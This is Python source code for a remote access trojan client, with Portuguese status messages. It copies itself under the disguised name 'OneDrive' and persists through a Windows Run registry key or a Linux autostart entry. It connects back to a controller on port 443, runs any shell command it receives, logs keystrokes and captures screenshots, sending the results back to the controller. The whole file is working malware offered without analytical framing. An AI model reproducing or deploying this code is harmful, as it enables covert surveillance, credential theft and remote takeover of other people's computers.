import os
import shutil
import socket
import subprocess
import sys
import platform
import io
from datetime import datetime
from time import sleep
from pynput import keyboard
from PIL import ImageGrab
import protocolo

IS_WINDOWS = os.name == "nt"
if IS_WINDOWS:
    import winreg

IP = "127.0.0.1"
PORT = 443
SOCKET_TIMEOUT = 1.0

PROGRAM_NAME = "OneDrive"
REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_DIR = os.path.expanduser("~/.config/autostart")
DESKTOP_FILE_PATH = os.path.join(AUTOSTART_DIR, f"{PROGRAM_NAME}.desktop")
MAX_BUFFER_SIZE = 300

keylog_buffer = []
buffer_auto_send_pending = False
keylogger_active = False
listener = None

def format_key(key):
    try:
        return key.char
    except AttributeError:
        special_key = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]\n",
            keyboard.Key.backspace: "[BACKSPACE]\n",
            keyboard.Key.shift: "",
            keyboard.Key.shift_r: "",
            keyboard.Key.ctrl: "",
            keyboard.Key.ctrl_r: "",
            keyboard.Key.alt: "",
            keyboard.Key.alt_r: "",
        }
        return special_key.get(key, f"[{str(key).replace('Key.', '').upper()}]")

def on_press(key):
    global keylog_buffer, buffer_auto_send_pending
    formatted = format_key(key)  
    if formatted:  
        keylog_buffer.append(formatted)  
    if len(keylog_buffer) >= MAX_BUFFER_SIZE:  
        buffer_auto_send_pending = True

def get_keylog_data():
    global keylog_buffer
    if not keylog_buffer:  
        return ""  
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
    data = f"[+] Keylog capturado em {timestamp}:\n{''.join(keylog_buffer)}\n"  
    keylog_buffer = []  
    return data

def start_keylogger():
    global keylogger_active, listener
    if keylogger_active:  
        return "[i] Capturador já se encontra em execução\n"  
    try:
        listener = keyboard.Listener(on_press=on_press)  
        listener.start()  
        keylogger_active = True  
        return "[+] Instância de captura iniciada\n"
    except Exception as e:
        return f"[-] Erro ao iniciar subsistema pynput: {type(e).__name__} -> {e}\n"

def stop_keylogger():
    global keylogger_active, listener
    if not keylogger_active:  
        return "[i] Nenhuma instância ativa encontrada.\n"  
    if listener is not None:  
        listener.stop()  
        listener = None  
    keylogger_active = False  
    return "[+] Capturador finalizado.\n"

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue()
    except Exception as e:
        return f"[-] Erro na captura de tela via ImageGrab: {type(e).__name__} -> {e}".encode('utf-8')

def copy_system_file():
    try:
        current_file = os.path.abspath(sys.argv[0])
        if IS_WINDOWS:
            appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
            if not os.path.exists(appdata_path):
                os.makedirs(appdata_path)
            ext = ".exe" if current_file.endswith(".exe") else ".py"
            destination = os.path.join(appdata_path, f"{PROGRAM_NAME}{ext}")  
        else:
            target_dir = os.path.expanduser("~/.local/share")
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)
            destination = os.path.join(target_dir, f"{PROGRAM_NAME}.py")  

        if os.path.abspath(current_file) != os.path.abspath(destination):  
            shutil.copy2(current_file, destination)  
            return destination  
        return current_file  
    except OSError as e:
        print(f"[-] Falha na cópia de persistência em disco: {e}")
        return os.path.abspath(sys.argv[0])

def check_persistence():
    try:
        if IS_WINDOWS:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, PROGRAM_NAME)  
            winreg.CloseKey(key)  
            return True  
        else:
            return os.path.exists(DESKTOP_FILE_PATH)
    except (FileNotFoundError, OSError):  
        return False

def setup_persistence():
    try:
        if check_persistence():
            return
        persistence_path = copy_system_file()  
        
        if IS_WINDOWS:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_SET_VALUE)
            exec_command = f'"{sys.executable}" "{persistence_path}"' if persistence_path.endswith(".py") else f'"{persistence_path}"'
            winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ, exec_command)  
            winreg.CloseKey(key)  
        else:
            if not os.path.exists(AUTOSTART_DIR):
                os.makedirs(AUTOSTART_DIR)
            desktop_entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{persistence_path}\"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName={PROGRAM_NAME}\n"
            with open(DESKTOP_FILE_PATH, "w") as f:
                f.write(desktop_entry)
    except (OSError, PermissionError) as e:  
        print(f"[-] Erro ao configurar chaves/arquivos de autostart: {e}")

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, "[#] Cliente conectado com sucesso\n".encode('utf-8'))
        return c
    except OSError as e:
        print(f"[-] Tentativa de conexão falhou para {ip}:{port}: {e}")
        return None

def listen(c):
    global buffer_auto_send_pending
    c.settimeout(SOCKET_TIMEOUT)
    while True:
        try:
            if buffer_auto_send_pending:
                data = get_keylog_data()
                if data:
                    protocolo.enviar_mensagem(c, protocolo.MSG_KEYLOG, data.encode('utf-8'))
                buffer_auto_send_pending = False

            try:
                tipo, payload = protocolo.ler_mensagem(c)
                if tipo != protocolo.MSG_TEXTO:
                    continue
                command = payload.decode('utf-8').strip()
                if not command:
                    continue
            except socket.timeout:
                continue

            if command == "/exit":
                break
            elif command == "/screenshot":
                img_data = capture_screenshot()
                protocolo.enviar_mensagem(c, protocolo.MSG_IMAGEM, img_data)
            elif command == "/keylog_start":
                res = start_keylogger()
                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, res.encode('utf-8'))
            elif command == "/keylog_dump":
                res = get_keylog_data()
                if not res:
                    res = "[i] Log temporário está vazio\n"
                protocolo.enviar_mensagem(c, protocolo.MSG_KEYLOG, res.encode('utf-8'))
            elif command == "/keylog_stop":
                res = stop_keylogger()
                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, res.encode('utf-8'))
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                output = stdout + stderr
                if not output:
                    output = b"[+] Comando executado sem retorno textual de saida\n"
                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, output)
        except RuntimeError as e:
            print(f"[-] Desconexão por falha estrutural de protocolo: {e}")
            break
        except OSError as e:
            print(f"[-] Falha operacional de rede encontrada na sessão: {e}")
            break
        except Exception as e:
            print(f"[!] Erro inesperado capturado no loop operacional: {type(e).__name__} -> {e}")
            break

def main():
    setup_persistence()
    while True:
        c = connect(IP, PORT)
        if c:
            listen(c)
            try:
                c.close()
            except OSError:
                pass
        sleep(5)

if __name__ == "__main__":
    main()
